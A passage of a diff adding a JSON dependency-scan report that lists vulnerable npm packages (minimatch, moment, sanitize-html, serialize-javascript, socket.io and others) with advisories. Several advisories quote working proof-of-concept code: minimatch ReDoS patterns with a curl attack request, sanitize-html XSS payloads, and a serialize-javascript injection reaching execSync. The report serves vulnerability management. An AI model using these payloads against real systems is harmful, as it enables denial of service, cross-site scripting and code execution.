is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here.  Depth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard.  `+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed).  **Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-7r86-cg39-jmmj (NPM)",
+          "severity": "HIGH",
+          "description": "### Summary  `matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `**` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.  ---  ### Details  The vulnerable loop is in `matchOne()` at [`src/index.ts#L960`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960):  ```typescript while (fr &lt; fl) {   ..   if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {     ..     return true   }   ..   fr++ } ```  When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each `**` multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).  There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning `false` on a non-matching input.  Measured timing with n=30 path segments:  | k (globstars) | Pattern size | Time     | |---------------|--------------|----------| | 7             | 36 bytes     | ~154ms   | | 9             | 46 bytes     | ~1.2s    | | 11            | 56 bytes     | ~5.4s    | | 12            | 61 bytes     | ~9.7s    | | 13            | 66 bytes     | ~15.9s   |  ---  ### PoC  Tested on minimatch@10.2.2, Node.js 20.  **Step 1 -- inline script**  ```javascript import { minimatch } from 'minimatch'  // k=9 globstars, n=30 path segments // pattern: 46 bytes, default options const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b' const path    = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a'  const start = Date.now() minimatch(path, pattern) console.log(Date.now() - start + 'ms') // ~1200ms ```  To scale the effect, increase k:  ```javascript // k=11 -&gt; ~5.4s, k=13 -&gt; ~15.9s const k = 11 const pattern = Array.from({ length: k }, () =&gt; '**/a').join('/') + '/b' const path    = Array(30).fill('a').join('/') minimatch(path, pattern) ```  No special options are required. This reproduces with the default `minimatch()` call.  **Step 2 -- HTTP server (event loop starvation proof)**  The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:  ```javascript // poc1-server.mjs import http from 'node:http' import { URL } from 'node:url' import { minimatch } from 'minimatch'  const PORT = 3000  const server = http.createServer((req, res) =&gt; {   const url = new URL(req.url, `http://localhost:${PORT}`)   if (url.pathname !== '/match') { res.writeHead(404); res.end(); return }    const pattern = url.searchParams.get('pattern') ?? ''   const path    = url.searchParams.get('path') ?? ''    const start  = process.hrtime.bigint()   const result = minimatch(path, pattern)   const ms     = Number(process.hrtime.bigint() - start) / 1e6    res.writeHead(200, { 'Content-Type': 'application/json' })   res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\\n') })  server.listen(PORT) ```  Terminal 1 -- start the server: ``` node poc1-server.mjs ```  Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell: ``` curl &quot;http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&amp;path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa&quot; &amp; ```  Terminal 3 -- while the attack is in-flight, send a benign request: ``` curl -w &quot;\\ntime_total: %{time_total}s\\n&quot; &quot;http://localhost:3000/match?pattern=**%2Fy%2Fz&amp;path=x%2Fy%2Fz&quot; ```  **Observed output (Terminal 3):** ``` {&quot;result&quot;:true,&quot;ms&quot;:&quot;0&quot;}  time_total: 4.132709s ```  The server reports `&quot;ms&quot;:&quot;0&quot;` -- the legitimate request itself takes zero processing time. The 4+ second `time_total` is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:  ``` {&quot;result&quot;:true,&quot;ms&quot;:&quot;0&quot;}  time_total: 0.001599s ```  ---  ### Impact  Any application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-3ppc-4f35-3m26 (NPM)",
+          "severity": "HIGH",
+          "description": "### Summary `minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive `*` wildcards followed by a literal character that doesn't appear in the test string. Each `*` compiles to a separate `[^/]*?` regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits.  The time complexity is O(4^N) where N is the number of `*` characters. With N=15, a single `minimatch()` call takes ~2 seconds. With N=34, it hangs effectively forever.   ### Details _Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._  ### PoC When minimatch compiles a glob pattern, each `*` becomes `[^/]*?` in the generated regex. For a pattern like `***************X***`:  ``` /^(?!\\.)[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?X[^/]*?[^/]*?[^/]*?$/ ```  When the test string doesn't contain `X`, the regex engine must try every possible way to distribute the characters across all the `[^/]*?` groups before concluding no match exists. With N groups and M characters, this is O(C(N+M, N)) &mdash; exponential. ### Impact Any application that passes user-controlled strings to `minimatch()` as the pattern argument is vulnerable to DoS. This includes: - File search/filter UIs that accept glob patterns - `.gitignore`-style filtering with user-defined rules - Build tools that accept glob configuration - Any API that exposes glob matching to untrusted input  ----  Thanks to @ljharb for back-porting the fix to legacy versions of minimatch."
+        }
+      ],
+      "filePath": "/src/package-lock.json?/minimatch:3.0.5"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "moment.js",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2017-18214",
+          "severity": "HIGH",
+          "description": "The moment module before 2.19.3 for Node.js is prone to a regular expression denial of service via a crafted date string, a different vulnerability than CVE-2016-4055."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2022-24785",
+          "severity": "HIGH",
+          "description": "Moment.js is a JavaScript date library for parsing, validating, manipulating, and formatting dates. A path traversal vulnerability impacts npm (server) users of Moment.js between versions 1.0.1 and 2.29.1, especially if a user-provided locale string is directly used to switch moment locale. This problem is patched in 2.29.2, and the patch can be applied to all affected versions. As a workaround, sanitize the user-provided locale name before passing it to Moment.js."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2016-4055",
+          "severity": "MEDIUM",
+          "description": "The duration function in the moment package before 2.11.2 for Node.js allows remote attackers to cause a denial of service (CPU consumption) via a long string, aka a &quot;regular expression Denial of Service (ReDoS).&quot;"
+        }
+      ],
+      "filePath": "/src/node_modules/express-jwt/node_modules/moment/moment.js",
+      "md5": "f542b4c84aa5db62baf27f246f10bbf5",
+      "sha1": "eb4adec77825f18b2e6e8c3aa65f84feecafd2fd",
+      "sha256": "8b3a7278392b657e57bb371e5fadf9a07f59db50dbbc8faadec5ab16f798e4c7"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "moment.min.js",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2017-18214",
+          "severity": "HIGH",
+          "description": "The moment module before 2.19.3 for Node.js is prone to a regular expression denial of service via a crafted date string, a different vulnerability than CVE-2016-4055."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2022-24785",
+          "severity": "HIGH",
+          "description": "Moment.js is a JavaScript date library for parsing, validating, manipulating, and formatting dates. A path traversal vulnerability impacts npm (server) users of Moment.js between versions 1.0.1 and 2.29.1, especially if a user-provided locale string is directly used to switch moment locale. This problem is patched in 2.29.2, and the patch can be applied to all affected versions. As a workaround, sanitize the user-provided locale name before passing it to Moment.js."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2016-4055",
+          "severity": "MEDIUM",
+          "description": "The duration function in the moment package before 2.11.2 for Node.js allows remote attackers to cause a denial of service (CPU consumption) via a long string, aka a &quot;regular expression Denial of Service (ReDoS).&quot;"
+        }
+      ],
+      "filePath": "/src/node_modules/express-jwt/node_modules/moment/min/moment.min.js",
+      "md5": "e8cdc98d1a718ec002f0ba18f2edac0c",
+      "sha1": "84d638fef033968ba31a7e3d7d4bd37522ef102a",
+      "sha256": "e1d1c13d08a6d477e65ce03824e1eb8fc4f9252882f8c07ac1ec727e4e20e03e"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "moment:2.0.0",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2017-18214",
+          "severity": "HIGH",
+          "description": "The moment module before 2.19.3 for Node.js is prone to a regular expression denial of service via a crafted date string, a different vulnerability than CVE-2016-4055."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2022-24785",
+          "severity": "HIGH",
+          "description": "Moment.js is a JavaScript date library for parsing, validating, manipulating, and formatting dates. A path traversal vulnerability impacts npm (server) users of Moment.js between versions 1.0.1 and 2.29.1, especially if a user-provided locale string is directly used to switch moment locale. This problem is patched in 2.29.2, and the patch can be applied to all affected versions. As a workaround, sanitize the user-provided locale name before passing it to Moment.js."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2016-4055",
+          "severity": "MEDIUM",
+          "description": "The duration function in the moment package before 2.11.2 for Node.js allows remote attackers to cause a denial of service (CPU consumption) via a long string, aka a &quot;regular expression Denial of Service (ReDoS).&quot;"
+        }
+      ],
+      "filePath": "/src/package-lock.json?/moment:2.0.0"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "nanoid:3.1.20",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2021-23566",
+          "severity": "MEDIUM",
+          "description": "The package nanoid from 3.0.0 and before 3.1.31 are vulnerable to Information Exposure via the valueOf() function which allows to reproduce the last id generated."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-qrpm-p2h7-hrv2 (NPM)",
+          "severity": "MEDIUM",
+          "description": "The package nanoid from 3.0.0, before 3.1.31, are vulnerable to Information Exposure via the valueOf() function which allows to reproduce the last id generated."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-mwcw-c2x4-8c55 (NPM)",
+          "severity": "MEDIUM",
+          "description": "When nanoid is called with a fractional value, there were a number of undesirable effects:  1. in browser and non-secure, the code infinite loops on while (size--) 2. in node, the value of poolOffset becomes fractional, causing calls to nanoid to return zeroes until the pool is next filled 3. if the first call in node is a fractional argument, the initial buffer allocation fails with an error  Version 3.3.8 and 5.0.9 are fixed."
+        }
+      ],
+      "filePath": "/src/package-lock.json?/nanoid:3.1.20"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "notevil:1.3.3",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2021-23771",
+          "severity": "MEDIUM",
+          "description": "This affects all versions of package notevil; all versions of package argencoders-notevil. It is vulnerable to Sandbox Escape leading to Prototype pollution. The package fails to restrict access to the main context, allowing an attacker to add or modify an object's prototype. **Note:** This vulnerability derives from an incomplete fix in [SNYK-JS-NOTEVIL-608878](https://security.snyk.io/vuln/SNYK-JS-NOTEVIL-608878)."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-8g4m-cjm2-96wq (NPM)",
+          "severity": "MEDIUM",
+          "description": "This affects all versions of package notevil; all versions of package argencoders-notevil. It is vulnerable to Sandbox Escape leading to Prototype pollution. The package fails to restrict access to the main context, allowing an attacker to add or modify an object's prototype. **Note:** This vulnerability derives from an incomplete fix in [SNYK-JS-NOTEVIL-608878](https://security.snyk.io/vuln/SNYK-JS-NOTEVIL-608878). This package has been deprecated."
+        }
+      ],
+      "filePath": "/src/package-lock.json?/notevil:1.3.3"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "parseuri:0.0.6",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NPM",
+          "name": "GHSA-6fx8-h7jm-663j (NPM)",
+          "severity": "MODERATE",
+          "description": "An issue in parse-uri v1.0.9 allows attackers to cause a Regular expression Denial of Service (ReDoS) via a crafted URL.  ## PoC ```js async function exploit() {     const parseuri = require(&quot;parse-uri&quot;);     // This input is designed to cause excessive backtracking in the regex     const craftedInput = 'http://example.com/' + 'a'.repeat(30000) + '?key=value';     const result = await parseuri(craftedInput);     } await exploit(); ```"
+        }
+      ],
+      "filePath": "/src/package-lock.json?socket.io-client:3.1.3/parseuri:0.0.6"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "sanitize-html:1.4.2",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NPM",
+          "name": "GHSA-rpr9-rxv7-x643 (NPM)",
+          "severity": "CRITICAL",
+          "description": "### Summary Under the default configuration, `sanitize-html` can turn attacker-controlled content inside a disallowed `xmp` element into live HTML or JavaScript. This is a sanitizer bypass in the default `disallowedTagsMode: 'discard'` path and can lead to stored XSS in applications that render sanitized output back to users.  ### Details In `sanitize-html@2.17.3`, the default `nonTextTags` list includes only `script`, `style`, `textarea`, and `option` in `index.js` lines 138-142. That means disallowed `xmp` tags are not treated as &quot;drop the entire contents&quot; tags.  Later, in the `ontext` handler at `index.js` lines 569-577, the code special-cases `textarea` and `xmp` and appends their text content directly to the output without escaping:  ```js } else if ((options.disallowedTagsMode === 'discard' || options.disallowedTagsMode === 'completelyDiscard') &amp;&amp; (tag === 'textarea' || tag === 'xmp')) {   result += text; } ```  Because `htmlparser2` treats `xmp` as a raw-text element, markup inside `xmp` is parsed as text on input but becomes live markup again once it is appended unescaped to the sanitized output.  This creates a default sanitizer bypass. For example, a disallowed `&lt;xmp&gt;` wrapper can be used to smuggle `&lt;script&gt;` or event-handler payloads through sanitization.  The README also appears to contradict the implementation. In the &quot;Discarding the entire contents of a disallowed tag&quot; section, the documented exception list names only `style`, `script`, `textarea`, and `option`, and does not mention `xmp`.  ### PoC Tested locally against `sanitize-html@2.17.3` on Node.js `v25.2.1`.  1. Install the package:  ```bash npm install sanitize-html ```  2. Run the following script:  ```js const sanitizeHtml = require('sanitize-html');  console.log(sanitizeHtml('&lt;xmp&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/xmp&gt;')); console.log(sanitizeHtml('&lt;xmp&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/xmp&gt;')); console.log(sanitizeHtml('&lt;xmp&gt;&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;&lt;/xmp&gt;')); ```  3. Observed output:  ```html &lt;script&gt;alert(1)&lt;/script&gt; &lt;img src=x onerror=alert(1)&gt; &lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt; ```  4. Render any of the returned strings in a browser context that trusts `sanitize-html` output, for example:  ```js const dirty = '&lt;xmp&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/xmp&gt;'; const clean = sanitizeHtml(dirty); ```  If `clean` is inserted into the DOM or stored and later rendered as trusted HTML, the attacker-controlled script executes.  ### Impact This is a cross-site scripting vulnerability in the default sanitizer behavior. Any application that uses `sanitize-html` defaults and then renders the returned HTML as trusted output is impacted. A remote attacker who can submit HTML content can trigger execution of arbitrary JavaScript in another user's browser when that content is viewed."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-cgfm-xwp7-2cvr (NPM)",
+          "severity": "HIGH",
+          "description": "The package sanitize-html before 2.7.1 are vulnerable to Regular Expression Denial of Service (ReDoS) due to insecure global regular expression replacement logic of HTML comment removal."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-3j7m-hmh3-9jmp (NPM)",
+          "severity": "MEDIUM",
+          "description": "Affected versions of `sanitize-html` do not sanitize input recursively, which may allow an attacker to execute arbitrary Javascript.   ## Recommendation  Update to version 1.4.3 or later."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-qhxp-v273-g94h (NPM)",
+          "severity": "MEDIUM",
+          "description": "`sanitize-html` prior to version 2.0.0-beta is vulnerable to Cross-site Scripting (XSS). The `sanitizeHtml()` function in `index.js` does not sanitize content when using the custom `transformTags` option, which is intended to convert attribute values into text. As a result, malicious input can be transformed into executable code."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-mjxr-4v3x-q3m4 (NPM)",
+          "severity": "MEDIUM",
+          "description": "Apostrophe Technologies sanitize-html before 2.3.2 does not properly validate the hostnames set by the &quot;allowedIframeHostnames&quot; option when the &quot;allowIframeRelativeUrls&quot; is set to true, which allows attackers to bypass hostname whitelist for iframe element, related using an src value that starts with &quot;/\\\\example.com&quot;."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-rjqq-98f6-6j3r (NPM)",
+          "severity": "MEDIUM",
+          "description": "Apostrophe Technologies sanitize-html before 2.3.1 does not properly handle internationalized domain name (IDN) which could allow an attacker to bypass hostname whitelist validation set by the &quot;allowedIframeHostnames&quot; option."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-rm97-x556-q36h (NPM)",
+          "severity": "MEDIUM",
+          "description": "Versions of the package sanitize-html before 2.12.1 are vulnerable to Information Exposure when used on the backend and with the style attribute allowed, allowing enumeration of files in the system (including project dependencies). An attacker could exploit this vulnerability to gather details about the file system structure and dependencies of the targeted server."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-xc6g-ggrc-qq4r (NPM)",
+          "severity": "MODERATE",
+          "description": "Affected versions of `sanitize-html` are vulnerable to cross-site scripting when allowedTags includes at least one `nonTextTag`.  ## Proof of Concept  ```js var sanitizeHtml = require('sanitize-html');  var dirty = '!&lt;textarea&gt;&amp;lt;/textarea&amp;gt;&lt;svg/onload=prompt`xs`&amp;gt;&lt;/textarea&gt;!'; var clean = sanitizeHtml(dirty, {     allowedTags: [ 'textarea' ] });  console.log(clean);  // !&lt;textarea&gt;&lt;/textarea&gt;&lt;svg/onload=prompt`xs`&gt;&lt;/textarea&gt;! ```   ## Recommendation  Update to version 1.11.4 or later."
+        }
+      ],
+      "filePath": "/src/package-lock.json?/sanitize-html:1.4.2"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "serialize-javascript:5.0.1",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NPM",
+          "name": "GHSA-5c6j-r48x-rmvq (NPM)",
+          "severity": "HIGH",
+          "description": "### Impact  The serialize-javascript npm package (versions &lt;= 7.0.2) contains a code injection vulnerability. It is an incomplete fix for CVE-2020-7660.  While `RegExp.source` is sanitized, `RegExp.flags` is interpolated directly into the generated output without escaping. A similar issue exists in `Date.prototype.toISOString()`.  If an attacker can control the input object passed to `serialize()`, they can inject malicious JavaScript via the flags property of a RegExp object. When the serialized string is later evaluated (via `eval`, `new Function`, or `&lt;script&gt;` tags), the injected code executes.  ```javascript const serialize = require('serialize-javascript'); // Create an object that passes instanceof RegExp with a spoofed .flags const fakeRegex = Object.create(RegExp.prototype); Object.defineProperty(fakeRegex, 'source', { get: () =&gt; 'x' }); Object.defineProperty(fakeRegex, 'flags', {   get: () =&gt; '&quot;+(global.PWNED=&quot;CODE_INJECTION_VIA_FLAGS&quot;)+&quot;' }); fakeRegex.toJSON = function() { return '@placeholder'; }; const output = serialize({ re: fakeRegex }); // Output: {&quot;re&quot;:new RegExp(&quot;x&quot;, &quot;&quot;+(global.PWNED=&quot;CODE_INJECTION_VIA_FLAGS&quot;)+&quot;&quot;)} let obj; eval('obj = ' + output); console.log(global.PWNED); // &quot;CODE_INJECTION_VIA_FLAGS&quot; &mdash; injected code executed! #h2. PoC 2: Code Injection via Date.toISOString() ```  ```javascript const serialize = require('serialize-javascript'); const fakeDate = Object.create(Date.prototype); fakeDate.toISOString = function() { return '&quot;+(global.DATE_PWNED=&quot;DATE_INJECTION&quot;)+&quot;'; }; fakeDate.toJSON = function() { return '2024-01-01'; }; const output = serialize({ d: fakeDate }); // Output: {&quot;d&quot;:new Date(&quot;&quot;+(global.DATE_PWNED=&quot;DATE_INJECTION&quot;)+&quot;&quot;)} eval('obj = ' + output); console.log(global.DATE_PWNED); // &quot;DATE_INJECTION&quot; &mdash; injected code executed! #h2. PoC 3: Remote Code Execution ```  ```javascript const serialize = require('serialize-javascript'); const rceRegex = Object.create(RegExp.prototype); Object.defineProperty(rceRegex, 'source', { get: () =&gt; 'x' }); Object.defineProperty(rceRegex, 'flags', {   get: () =&gt; '&quot;+require(&quot;child_process&quot;).execSync(&quot;id&quot;).toString()+&quot;' }); rceRegex.toJSON = function() { return '@rce'; }; const output = serialize({ re: rceRegex }); // Output: {&quot;re&quot;:new RegExp(&quot;x&quot;, &quot;&quot;+require(&quot;child_process&quot;).execSync(&quot;id&quot;).toString()+&quot;&quot;)} // When eval'd on a Node.js server, executes the &quot;id&quot; system command ```  ### Patches  The fix has been published in version 7.0.3. https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.3"
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-qj8w-gfj5-8c6v (NPM)",
+          "severity": "MEDIUM",
+          "description": "### Impact  **What kind of vulnerability is it?**  It is a **Denial of Service (DoS)** vulnerability caused by CPU exhaustion. When serializing a specially crafted &quot;array-like&quot; object (an object that inherits from `Array.prototype` but has a very large `length` property), the process enters an intensive loop that consumes 100% CPU and hangs indefinitely.  **Who is impacted?**  Applications that use `serialize-javascript` to serialize untrusted or user-controlled objects are at risk. While direct exploitation is difficult, it becomes a high-priority threat if the application is also vulnerable to **Prototype Pollution** or handles untrusted data via **YAML Deserialization**, as these could be used to inject the malicious object.  ### Patches  **Has the problem been patched?**  Yes, the issue has been patched by replacing `instanceof Array` checks with `Array.isArray()` and using `Object.keys()` for sparse array detection.  **What versions should users upgrade to?**  Users should upgrade to **`v7.0.5`** or later.  ### Workarounds  **Is there a way for users to fix or remediate the vulnerability without upgrading?**  There is no direct code-level workaround within the library itself. However, users can mitigate the risk by:  * Validating and sanitizing all input before passing it to the `serialize()` function. * Ensuring the environment is protected against Prototype Pollution. * Upgrading to **`v7.0.5`** as soon as possible.  ### Acknowledgements  Serialize JavaScript thanks **Tomer Aberbach** (@TomerAberbach) for discovering and privately disclosing this issue."
+        }
+      ],
+      "filePath": "/src/package-lock.json?/serialize-javascript:5.0.1"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "simple-get:4.0.1",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2022-0355",
+          "severity": "HIGH",
+          "description": "Improper Removal of Sensitive Information Before Storage or Transfer in NPM simple-get prior to 4.0.1."
+        }
+      ],
+      "filePath": "/src/package-lock.json?/simple-get:4.0.1"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "socket.io-parser:4.0.5",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2026-33151",
+          "severity": "HIGH",
+          "description": "Socket.IO is an open source, real-time, bidirectional, event-based, communication framework. Prior to versions 3.3.5, 3.4.4, and 4.2.6, a specially crafted Socket.IO packet can make the server wait for a large number of binary attachments and buffer them, which can be exploited to make the server run out of memory. This issue has been patched in versions 3.3.5, 3.4.4, and 4.2.6."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2023-32695",
+          "severity": "HIGH",
+          "description": "socket.io parser is a socket.io encoder and decoder written in JavaScript complying with version 5 of socket.io-protocol. A specially crafted Socket.IO packet can trigger an uncaught exception on the Socket.IO server, thus killing the Node.js process. A patch has been released in version 4.2.3."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-cqmj-92xf-r6r9 (NPM)",
+          "severity": "HIGH",
+          "description": "### Impact  A specially crafted Socket.IO packet can trigger an uncaught exception on the Socket.IO server, thus killing the Node.js process.  ``` TypeError: Cannot convert object to primitive value        at Socket.emit (node:events:507:25)        at .../node_modules/socket.io/lib/socket.js:531:14 ```  ### Patches  A fix has been released today (2023/05/22):  - https://github.com/socketio/socket.io-parser/commit/3b78117bf6ba7e99d7a5cfc1ba54d0477554a7f3, included in `socket.io-parser@4.2.3` - https://github.com/socketio/socket.io-parser/commit/2dc3c92622dad113b8676be06f23b1ed46b02ced, included in `socket.io-parser@3.4.3`   Another fix has been released for the `3.3.x` branch:  - https://github.com/socketio/socket.io-parser/commit/ee006607495eca4ec7262ad080dd3a91439a5ba4, included in `socket.io-parser@3.3.4  | `socket.io` version | `socket.io-parser` version                                                                              | Needs minor update?                  | |---------------------|---------------------------------------------------------------------------------------------------------|--------------------------------------| | `4.5.2...latest`    | `~4.2.0` ([ref](https://github.com/socketio/socket.io/commit/9890b036cf942f6b6ad2afeb6a8361c32cd5d528)) | `npm audit fix` should be sufficient | | `4.1.3...4.5.1`     | `~4.1.1` ([ref](https://github.com/socketio/socket.io/commit/7c44893d7878cd5bba1eff43150c3e664f88fb57)) | Please upgrade to `socket.io@4.6.x`  | | `3.0.5...4.1.2`     | `~4.0.3` ([ref](https://github.com/socketio/socket.io/commit/752dfe3b1e5fecda53dae899b4a39e6fed5a1a17)) | Please upgrade to `socket.io@4.6.x`  | | `3.0.0...3.0.4`     | `~4.0.1` ([ref](https://github.com/socketio/socket.io/commit/1af3267e3f5f7884214cf2ca4d5282d620092fb0)) | Please upgrade to `socket.io@4.6.x`  | | `2.3.0...2.5.0`     | `~3.4.0` ([ref](https://github.com/socketio/socket.io/commit/cf39362014f5ff13a17168b74772c43920d6e4fd)) | `npm audit fix` should be sufficient |   ### Workarounds  There is no known workaround except upgrading to a safe version.  ### For more information  If you have any questions or comments about this advisory:  - Open a discussion [here](https://github.com/socketio/socket.io/discussions)  Thanks to [@rafax00](https://github.com/rafax00) for the responsible disclosure."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-677m-j7p3-52f9 (NPM)",
+          "severity": "HIGH",
+          "description": "### Impact  A specially crafted Socket.IO packet can make the server wait for a large number of binary attachments and buffer them, which can be exploited to make the server run out of memory.  ### Patches  | Version range    | Used by                                    | Fixed version | |------------------|--------------------------------------------|---------------| | `&gt;=4.0.0 &lt;4.2.6` | `socket.io@4.x` and `socket.io-client@4.x` | `4.2.6`       | | `&gt;=3.4.0 &lt;3.4.4` | `socket.io@2.x`                            | `3.4.4`       | | `&lt;3.3.5`         | `socket.io-client@2.x`                     | `3.3.5`       |  ### Workarounds  There is no known workaround except upgrading to a safe version.  ### For more information  If you have any questions or comments about this advisory:  - Open a discussion [here](https://github.com/socketio/socket.io/discussions)"
+        }
+      ],
+      "filePath": "/src/package-lock.json?/socket.io-parser:4.0.5"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "socket.io:3.1.2",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NPM",
+          "name": "GHSA-25hc-qcg6-38wj (NPM)",
+          "severity": "HIGH",
+          "description": "### Impact  A specially crafted Socket.IO packet can trigger an uncaught exception on the Socket.IO server, thus killing the Node.js process.  ``` node:events:502     throw err; // Unhandled 'error' event     ^  Error [ERR_UNHANDLED_ERROR]: Unhandled error. (undefined)     at new NodeError (node:internal/errors:405:5)     at Socket.emit (node:events:500:17)     at /myapp/node_modules/socket.io/lib/socket.js:531:14     at process.processTicksAndRejections (node:internal/process/task_queues:77:11) {   code: 'ERR_UNHANDLED_ERROR',   context: undefined } ```  ### Affected versions  | Version range    | Needs minor update?                            | |------------------|------------------------------------------------| | `4.6.2...latest` | Nothing to do               | | `3.0.0...4.6.1`  | Please upgrade to `socket.io@4.6.2` (at least) | | `2.3.0...2.5.0`  | Please upgrade to `socket.io@2.5.1`            |  ### Patches  This issue is fixed by https://github.com/socketio/socket.io/commit/15af22fc22bc6030fcead322c106f07640336115, included in `socket.io@4.6.2` (released in May 2023).  The fix was backported in the 2.x branch today: https://github.com/socketio/socket.io/commit/d30630ba10562bf987f4d2b42440fc41a828119c  ### Workarounds  As a workaround for the affected versions of the `socket.io` package, you can attach a listener for the &quot;error&quot; event:  ```js io.on(&quot;connection&quot;, (socket) =&gt; {   socket.on(&quot;error&quot;, () =&gt; {     // ...   }); }); ```  ### For more information  If you have any questions 